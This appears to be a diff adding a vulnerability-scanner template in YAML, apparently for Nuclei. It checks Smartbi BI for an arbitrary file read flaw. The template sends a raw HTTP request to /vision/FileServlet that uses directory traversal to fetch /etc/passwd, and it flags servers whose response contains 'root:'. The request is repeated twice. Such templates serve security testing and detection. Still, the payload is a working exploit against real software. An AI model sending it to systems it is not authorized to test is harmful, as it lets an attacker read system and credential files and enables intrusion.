@@ -1,0 +1,27 @@
+id: smartbi-smartbi-bi-readfile
+
+info:
+  name: Smartbi smartbi_bi 任意文件读取
+  author: xpoc
+  severity: high
+  tags: smartbi,readfile
+http:
+  - raw:
+      - |-
+        GET /vision/FileServlet?ftpType=out&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx&path=upload/../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+      - |+
+        GET /vision/FileServlet?ftpType=out&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx&path=upload/../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
